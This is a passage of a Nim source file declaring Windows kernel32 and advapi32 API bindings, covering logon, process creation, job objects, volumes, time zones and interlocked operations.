LPCWSTR, lpDCB: LPDCB, lpCommTimeouts: LPCOMMTIMEOUTS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CommConfigDialogA*(lpszName: LPCSTR, hWnd: HWND, lpCC: LPCOMMCONFIG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CommConfigDialogW*(lpszName: LPCWSTR, hWnd: HWND, lpCC: LPCOMMCONFIG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDefaultCommConfigA*(lpszName: LPCSTR, lpCC: LPCOMMCONFIG, lpdwSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDefaultCommConfigW*(lpszName: LPCWSTR, lpCC: LPCOMMCONFIG, lpdwSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetDefaultCommConfigA*(lpszName: LPCSTR, lpCC: LPCOMMCONFIG, dwSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetDefaultCommConfigW*(lpszName: LPCWSTR, lpCC: LPCOMMCONFIG, dwSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetComputerNameA*(lpBuffer: LPSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetComputerNameW*(lpBuffer: LPWSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetComputerNameA*(lpComputerName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetComputerNameW*(lpComputerName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetComputerNameExA*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPCTSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DnsHostnameToComputerNameA*(Hostname: LPCSTR, ComputerName: LPSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DnsHostnameToComputerNameW*(Hostname: LPCWSTR, ComputerName: LPWSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetUserNameA*(lpBuffer: LPSTR, pcbBuffer: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetUserNameW*(lpBuffer: LPWSTR, pcbBuffer: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LogonUserA*(lpszUsername: LPCSTR, lpszDomain: LPCSTR, lpszPassword: LPCSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LogonUserW*(lpszUsername: LPCWSTR, lpszDomain: LPCWSTR, lpszPassword: LPCWSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LogonUserExA*(lpszUsername: LPCSTR, lpszDomain: LPCSTR, lpszPassword: LPCSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE, ppLogonSid: ptr PSID, ppProfileBuffer: ptr PVOID, pdwProfileLength: LPDWORD, pQuotaLimits: PQUOTA_LIMITS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LogonUserExW*(lpszUsername: LPCWSTR, lpszDomain: LPCWSTR, lpszPassword: LPCWSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE, ppLogonSid: ptr PSID, ppProfileBuffer: ptr PVOID, pdwProfileLength: LPDWORD, pQuotaLimits: PQUOTA_LIMITS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreateProcessAsUserA*(hToken: HANDLE, lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreateProcessWithLogonW*(lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR, dwLogonFlags: DWORD, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR, lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CreateProcessWithTokenW*(hToken: HANDLE, dwLogonFlags: DWORD, lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCWSTR, lpStartupInfo: LPSTARTUPINFOW, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc IsTokenUntrusted*(TokenHandle: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc RegisterWaitForSingleObject*(phNewWaitObject: PHANDLE, hObject: HANDLE, Callback: WAITORTIMERCALLBACK, Context: PVOID, dwMilliseconds: ULONG, dwFlags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnregisterWait*(WaitHandle: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc BindIoCompletionCallback*(FileHandle: HANDLE, Function: LPOVERLAPPED_COMPLETION_ROUTINE, Flags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetTimerQueueTimer*(TimerQueue: HANDLE, Callback: WAITORTIMERCALLBACK, Parameter: PVOID, DueTime: DWORD, Period: DWORD, PreferIo: WINBOOL): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CancelTimerQueueTimer*(TimerQueue: HANDLE, Timer: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteTimerQueue*(TimerQueue: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreatePrivateNamespaceA*(lpPrivateNamespaceAttributes: LPSECURITY_ATTRIBUTES, lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenPrivateNamespaceA*(lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateBoundaryDescriptorA*(Name: LPCSTR, Flags: ULONG): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddIntegrityLabelToBoundaryDescriptor*(BoundaryDescriptor: ptr HANDLE, IntegrityLabel: PSID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentHwProfileA*(lpHwProfileInfo: LPHW_PROFILE_INFOA): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetCurrentHwProfileW*(lpHwProfileInfo: LPHW_PROFILE_INFOW): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc VerifyVersionInfoA*(lpVersionInformation: LPOSVERSIONINFOEXA, dwTypeMask: DWORD, dwlConditionMask: DWORDLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc VerifyVersionInfoW*(lpVersionInformation: LPOSVERSIONINFOEXW, dwTypeMask: DWORD, dwlConditionMask: DWORDLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SystemTimeToTzSpecificLocalTime*(lpTimeZoneInformation: ptr TIME_ZONE_INFORMATION, lpUniversalTime: ptr SYSTEMTIME, lpLocalTime: LPSYSTEMTIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc TzSpecificLocalTimeToSystemTime*(lpTimeZoneInformation: ptr TIME_ZONE_INFORMATION, lpLocalTime: ptr SYSTEMTIME, lpUniversalTime: LPSYSTEMTIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FileTimeToSystemTime*(lpFileTime: ptr FILETIME, lpSystemTime: LPSYSTEMTIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SystemTimeToFileTime*(lpSystemTime: ptr SYSTEMTIME, lpFileTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTimeZoneInformation*(lpTimeZoneInformation: LPTIME_ZONE_INFORMATION): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDynamicTimeZoneInformation*(pTimeZoneInformation: PDYNAMIC_TIME_ZONE_INFORMATION): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTimeZoneInformationForYear*(wYear: USHORT, pdtzi: PDYNAMIC_TIME_ZONE_INFORMATION, ptzi: LPTIME_ZONE_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumDynamicTimeZoneInformation*(dwIndex: DWORD, lpTimeZoneInformation: PDYNAMIC_TIME_ZONE_INFORMATION): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetDynamicTimeZoneInformationEffectiveYears*(lpTimeZoneInformation: PDYNAMIC_TIME_ZONE_INFORMATION, FirstYear: LPDWORD, LastYear: LPDWORD): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc SystemTimeToTzSpecificLocalTimeEx*(lpTimeZoneInformation: ptr DYNAMIC_TIME_ZONE_INFORMATION, lpUniversalTime: ptr SYSTEMTIME, lpLocalTime: LPSYSTEMTIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc TzSpecificLocalTimeToSystemTimeEx*(lpTimeZoneInformation: ptr DYNAMIC_TIME_ZONE_INFORMATION, lpLocalTime: ptr SYSTEMTIME, lpUniversalTime: LPSYSTEMTIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetTimeZoneInformation*(lpTimeZoneInformation: ptr TIME_ZONE_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetDynamicTimeZoneInformation*(lpTimeZoneInformation: ptr DYNAMIC_TIME_ZONE_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemPowerStatus*(lpSystemPowerStatus: LPSYSTEM_POWER_STATUS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetSystemPowerState*(fSuspend: WINBOOL, fForce: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RegisterBadMemoryNotification*(Callback: PBAD_MEMORY_CALLBACK_ROUTINE): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnregisterBadMemoryNotification*(RegistrationHandle: PVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetMemoryErrorHandlingCapabilities*(Capabilities: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc AllocateUserPhysicalPages*(hProcess: HANDLE, NumberOfPages: PULONG_PTR, PageArray: PULONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FreeUserPhysicalPages*(hProcess: HANDLE, NumberOfPages: PULONG_PTR, PageArray: PULONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MapUserPhysicalPages*(VirtualAddress: PVOID, NumberOfPages: ULONG_PTR, PageArray: PULONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MapUserPhysicalPagesScatter*(VirtualAddresses: ptr PVOID, NumberOfPages: ULONG_PTR, PageArray: PULONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateJobObjectA*(lpJobAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateJobObjectW*(lpJobAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenJobObjectA*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenJobObjectW*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc AssignProcessToJobObject*(hJob: HANDLE, hProcess: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc TerminateJobObject*(hJob: HANDLE, uExitCode: UINT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryInformationJobObject*(hJob: HANDLE, JobObjectInformationClass: JOBOBJECTINFOCLASS, lpJobObjectInformation: LPVOID, cbJobObjectInformationLength: DWORD, lpReturnLength: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetInformationJobObject*(hJob: HANDLE, JobObjectInformationClass: JOBOBJECTINFOCLASS, lpJobObjectInformation: LPVOID, cbJobObjectInformationLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateJobSet*(NumJob: ULONG, UserJobSet: PJOB_SET_ARRAY, Flags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstVolumeA*(lpszVolumeName: LPSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextVolumeA*(hFindVolume: HANDLE, lpszVolumeName: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstVolumeMountPointA*(lpszRootPathName: LPCSTR, lpszVolumeMountPoint: LPSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstVolumeMountPointW*(lpszRootPathName: LPCWSTR, lpszVolumeMountPoint: LPWSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextVolumeMountPointA*(hFindVolumeMountPoint: HANDLE, lpszVolumeMountPoint: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextVolumeMountPointW*(hFindVolumeMountPoint: HANDLE, lpszVolumeMountPoint: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindVolumeMountPointClose*(hFindVolumeMountPoint: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetVolumeMountPointA*(lpszVolumeMountPoint: LPCSTR, lpszVolumeName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetVolumeMountPointW*(lpszVolumeMountPoint: LPCWSTR, lpszVolumeName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteVolumeMountPointA*(lpszVolumeMountPoint: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumeNameForVolumeMountPointA*(lpszVolumeMountPoint: LPCSTR, lpszVolumeName: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumePathNameA*(lpszFileName: LPCSTR, lpszVolumePathName: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumePathNamesForVolumeNameA*(lpszVolumeName: LPCSTR, lpszVolumePathNames: LPCH, cchBufferLength: DWORD, lpcchReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc AllocateUserPhysicalPagesNuma*(hProcess: HANDLE, NumberOfPages: PULONG_PTR, PageArray: PULONG_PTR, nndPreferred: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateActCtxA*(pActCtx: PCACTCTXA): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateActCtxW*(pActCtx: PCACTCTXW): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddRefActCtx*(hActCtx: HANDLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReleaseActCtx*(hActCtx: HANDLE): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ZombifyActCtx*(hActCtx: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ActivateActCtx*(hActCtx: HANDLE, lpCookie: ptr ULONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeactivateActCtx*(dwFlags: DWORD, ulCookie: ULONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentActCtx*(lphActCtx: ptr HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindActCtxSectionStringA*(dwFlags: DWORD, lpExtensionGuid: ptr GUID, ulSectionId: ULONG, lpStringToFind: LPCSTR, ReturnedData: PACTCTX_SECTION_KEYED_DATA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindActCtxSectionStringW*(dwFlags: DWORD, lpExtensionGuid: ptr GUID, ulSectionId: ULONG, lpStringToFind: LPCWSTR, ReturnedData: PACTCTX_SECTION_KEYED_DATA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindActCtxSectionGuid*(dwFlags: DWORD, lpExtensionGuid: ptr GUID, ulSectionId: ULONG, lpGuidToFind: ptr GUID, ReturnedData: PACTCTX_SECTION_KEYED_DATA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryActCtxW*(dwFlags: DWORD, hActCtx: HANDLE, pvSubInstance: PVOID, ulInfoClass: ULONG, pvBuffer: PVOID, cbBuffer: SIZE_T, pcbWrittenOrRequired: ptr SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WTSGetActiveConsoleSessionId*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaProcessorNode*(Processor: UCHAR, NodeNumber: PUCHAR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaNodeProcessorMask*(Node: UCHAR, ProcessorMask: PULONGLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaAvailableMemoryNode*(Node: UCHAR, AvailableBytes: PULONGLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaProximityNode*(ProximityId: ULONG, NodeNumber: PUCHAR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetActiveProcessorGroupCount*(): WORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetMaximumProcessorGroupCount*(): WORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetActiveProcessorCount*(GroupNumber: WORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetMaximumProcessorCount*(GroupNumber: WORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaNodeNumberFromHandle*(hFile: HANDLE, NodeNumber: PUSHORT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaProcessorNodeEx*(Processor: PPROCESSOR_NUMBER, NodeNumber: PUSHORT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaAvailableMemoryNodeEx*(Node: USHORT, AvailableBytes: PULONGLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNumaProximityNodeEx*(ProximityId: ULONG, NodeNumber: PUSHORT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RegisterApplicationRecoveryCallback*(pRecoveyCallback: APPLICATION_RECOVERY_CALLBACK, pvParameter: PVOID, dwPingInterval: DWORD, dwFlags: DWORD): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnregisterApplicationRecoveryCallback*(): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc RegisterApplicationRestart*(pwzCommandline: PCWSTR, dwFlags: DWORD): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnregisterApplicationRestart*(): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetApplicationRecoveryCallback*(hProcess: HANDLE, pRecoveryCallback: ptr APPLICATION_RECOVERY_CALLBACK, ppvParameter: ptr PVOID, pdwPingInterval: PDWORD, pdwFlags: PDWORD): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetApplicationRestartSettings*(hProcess: HANDLE, pwzCommandline: PWSTR, pcchSize: PDWORD, pdwFlags: PDWORD): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc ApplicationRecoveryInProgress*(pbCancelled: PBOOL): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc ApplicationRecoveryFinished*(bSuccess: WINBOOL): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileInformationByHandleEx*(hFile: HANDLE, FileInformationClass: FILE_INFO_BY_HANDLE_CLASS, lpFileInformation: LPVOID, dwBufferSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenFileById*(hVolumeHint: HANDLE, lpFileId: LPFILE_ID_DESCRIPTOR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwFlagsAndAttributes: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSymbolicLinkA*(lpSymlinkFileName: LPCSTR, lpTargetFileName: LPCSTR, dwFlags: DWORD): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSymbolicLinkW*(lpSymlinkFileName: LPCWSTR, lpTargetFileName: LPCWSTR, dwFlags: DWORD): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSymbolicLinkTransactedA*(lpSymlinkFileName: LPCSTR, lpTargetFileName: LPCSTR, dwFlags: DWORD, hTransaction: HANDLE): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSymbolicLinkTransactedW*(lpSymlinkFileName: LPCWSTR, lpTargetFileName: LPCWSTR, dwFlags: DWORD, hTransaction: HANDLE): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryActCtxSettingsW*(dwFlags: DWORD, hActCtx: HANDLE, settingsNameSpace: PCWSTR, settingName: PCWSTR, pvBuffer: PWSTR, dwBuffer: SIZE_T, pdwWrittenOrRequired: ptr SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReplacePartitionUnit*(TargetPartition: PWSTR, SparePartition: PWSTR, Flags: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddSecureMemoryCacheCallback*(pfnCallBack: PSECURE_MEMORY_CACHE_CALLBACK): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveSecureMemoryCacheCallback*(pfnCallBack: PSECURE_MEMORY_CACHE_CALLBACK): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyContext*(Destination: PCONTEXT, ContextFlags: DWORD, Source: PCONTEXT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitializeContext*(Buffer: PVOID, ContextFlags: DWORD, Context: ptr PCONTEXT, ContextLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnableThreadProfiling*(ThreadHandle: HANDLE, Flags: DWORD, HardwareCounters: DWORD64, PerformanceDataHandle: ptr HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc DisableThreadProfiling*(PerformanceDataHandle: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryThreadProfiling*(ThreadHandle: HANDLE, Enabled: PBOOLEAN): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReadThreadProfilingData*(PerformanceDataHandle: HANDLE, Flags: DWORD, PerformanceData: PPERFORMANCE_DATA): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCurrentTime*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetTickCount".}proc LockSegment*(hMem: HGLOBAL): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalFix".}proc UnlockSegment*(hMem: HGLOBAL): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalUnfix".}proc FreeModule*(hLibModule: HMODULE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FreeLibrary".}proc InterlockedPushListSList*(ListHead: PSLIST_HEADER, List: PSLIST_ENTRY, ListEnd: PSLIST_ENTRY, Count: ULONG): PSLIST_ENTRY {.winapi, stdcall, dynlib: "kernel32", importc: "InterlockedPushListSListEx".}template HasOverlappedIoCompleted*(lpOverlapped: LPOVERLAPPED): bool = lpOverlapped.Internal != STATUS_PENDINGtemplate RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)template SecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)template RtlZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)template ZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = copyMem(Destination, Source, Length)template CopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = copyMem(Destination, Source, Length)template MAKEINTATOM*(i: untyped): untyped = cast[LPTSTR](i and 0xffff)proc LocalDiscard*(h: HLOCAL): HLOCAL {.winapi, inline.} = LocalReAlloc(h, 0, LMEM_MOVEABLE)proc GlobalDiscard*(h: HGLOBAL): HGLOBAL {.winapi, inline.} = GlobalReAlloc(h, 0, GMEM_MOVEABLE)when winimAnsi:  proc LookupAccountName*(lpSystemName: LPCSTR, lpAccountName: LPCSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupAccountNameA".}proc LookupAccountNameLocalA*(lpAccountName: LPCSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountNameA(nil, lpAccountName, Sid, cbSid, ReferencedDomainName, cchReferencedDomainName, peUse)when winimUnicode:  proc LookupAccountName*(lpSystemName: LPCWSTR, lpAccountName: LPCWSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupAccountNameW".}proc LookupAccountNameLocalW*(lpAccountName: LPCWSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountNameW(nil, lpAccountName, Sid, cbSid, ReferencedDomainName, cchReferencedDomainName, peUse)when winimAnsi:  proc LookupAccountSid*(lpSystemName: LPCSTR, Sid: PSID, Name: LPSTR, cchName: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupAccountSidA".}proc LookupAccountSidLocalA*(Sid: PSID, Name: LPSTR, cchName: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountSidA(nil, Sid, Name, cchName, ReferencedDomainName, cchReferencedDomainName, peUse)when winimUnicode:  proc LookupAccountSid*(lpSystemName: LPCWSTR, Sid: PSID, Name: LPWSTR, cchName: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupAccountSidW".}proc LookupAccountSidLocalW*(Sid: PSID, Name: LPWSTR, cchName: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountSidW(nil, Sid, Name, cchName, ReferencedDomainName, cchReferencedDomainName, peUse)proc InterlockedOr*(Destination: ptr LONG, Value: LONG): LONG {.importc: "InterlockedOr", header: "&lt;windows.h&gt;".}proc InterlockedOr8*(Destination: ptr byte, Value: byte): byte {.importc: "InterlockedOr8", header: "&lt;windows.h&gt;".}proc InterlockedOr16*(Destination: ptr SHORT, Value: SHORT): SHORT {.importc: "InterlockedOr16", header: "&lt;windows.h&gt;".}proc InterlockedOr64*(Destination: ptr LONGLONG, Value: LONGLONG): LONGLONG {.importc: "InterlockedOr64", header: "&lt;windows.h&gt;".}proc InterlockedXor*(Destination: ptr LONG, Value: LONG): LONG {.importc: "InterlockedXor", header: "&lt;windows.h&gt;".}proc InterlockedXor8*(Destination: ptr byte, Value: byte): byte {.importc: "InterlockedXor8", header: "&lt;windows.h&gt;".}proc InterlockedXor16*(Destination: ptr SHORT, Value: SHORT): SHORT {.importc: "InterlockedXor16", header: "&lt;windows.h&gt;".}proc InterlockedXor64*(Destination: ptr LONGLONG, Value: LONGLONG): LONGLONG {.importc: "InterlockedXor64", header: "&lt;windows.h&gt;".}proc InterlockedAnd*(Destination: ptr LONG, Value: LONG): LONG {.importc: "InterlockedAnd", header: "&lt;windows.h&gt;".}proc InterlockedAnd8*(Destination: ptr byte, Value: byte): byte {.importc: "InterlockedAnd8", header: "&lt;windows.h&gt;".}proc InterlockedAnd16*(Destination: ptr SHORT, Value: SHORT): SHORT {.importc: 